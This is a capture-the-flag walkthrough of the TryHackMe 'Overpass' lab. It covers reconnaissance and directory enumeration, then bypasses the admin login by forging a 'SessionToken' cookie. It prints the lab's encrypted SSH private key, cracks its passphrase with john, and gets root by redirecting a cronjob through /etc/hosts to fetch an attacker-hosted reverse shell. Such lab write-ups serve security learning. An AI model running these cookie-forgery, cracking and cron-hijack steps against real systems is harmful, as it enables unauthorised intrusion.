[![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
[![Needed-Gobuster](https://img.shields.io/badge/Needed-Gobuster-orange)](https://github.com/OJ/gobuster)
[![Needed-John](https://img.shields.io/badge/Needed-John-red)](https://github.com/openwall/john)

# Overpass
*What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!*

## Reconnaissance
Running nmap on the target machine it's the first step. The result is:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -sC -sV 10.10.123.120

Nmap scan report for 10.10.123.120
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 22 runs OpenSSh service, but at this point I don't have credentials nor a SSH key. Maybe it will be useful later.<br>
Port 80 runs Overpass site over http. There is nothing particularly strange, so I can procede with enumeration

## Enumeration
As always gobuster is a must, and even this time it tells me that there's an "admin" dir... Very imaginative!
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt dir -u http://10.10.123.120/ -x py,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.120/
[+] Method:                  GET
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] Extensions:              py,php,txt
===============================================================
2022/03/25 18:18:05 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
...
```

## Login
### Admin panel login
Visiting `/admin` I can see a login form. Brute-forcing seems pretty long and tedious, so the first thing to do (always) is check the code.<br>
Indeed, this code is somehow bugged:
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)  // <--- Do NOT do this at home
        window.location = "/admin"
    }
}
```

In case you don't get this don't worry, I lost some time on this (^_^;)<br>
It seems that the only thing shielding the admin page from the attackers is a cookie... Then why not forging one!?
Using the browser I can do it by opening developer panel and going to **Application > Cookie > sitename.com > +**. It's not even important the cookie's content, but the name must be "SessionToken".

Now I can refresh (actually I went to `admin/?`, since refreshing didn't work for me as it did with others) and see a page with some instruction written by the lead developer.
Inside there's an SSH certificate to log on the machine, but we don't know the passphrase
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

### SSH connection
Having the SSH key I can crack the passphrase, if it's contained in my dictionary (rockyou.txt). To do this I use ssh2john, and then john.
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Overpass]
└─$ john h.hash --wordlist=/usr/share/wordlists/rockyou.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
james13          (id_rsa)     
1g 0:00:00:00 DONE (2022-03-26 23:48) 33.33g/s 445866p/s 445866c/s 445866C/s 120806..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
It takes a very short time to unveil the passphrase: "james13". Now I can connect to `james@10.10.59.169` with the [certificate](./id_rsa).
Once I'm in, I can find the user flag in `/home/james`.

## PrivEsc
Since `sudo -l` and `find / .perm 6000` don't give out anything useful I download `linpeas.sh` and host it on a python http sever to upload it on the target machine.
Running `linpeas.sh` I notice that:
- a cronjob calls a bash script from tryhackme.com
- `/etc/hosts` is writable

Modifying `/etc/hosts` I pair my IP address with the name `tryhackme.com`, so from now on the target will reach my IP to get the script. Now I just need to create a bash [reverse shell](./downloads/src/buildscript.sh) to host with a python http server on port 80.<br>
In a moment netcat, waiting obediently on port 4242, will get his shell. Root flag will be in `/root` :)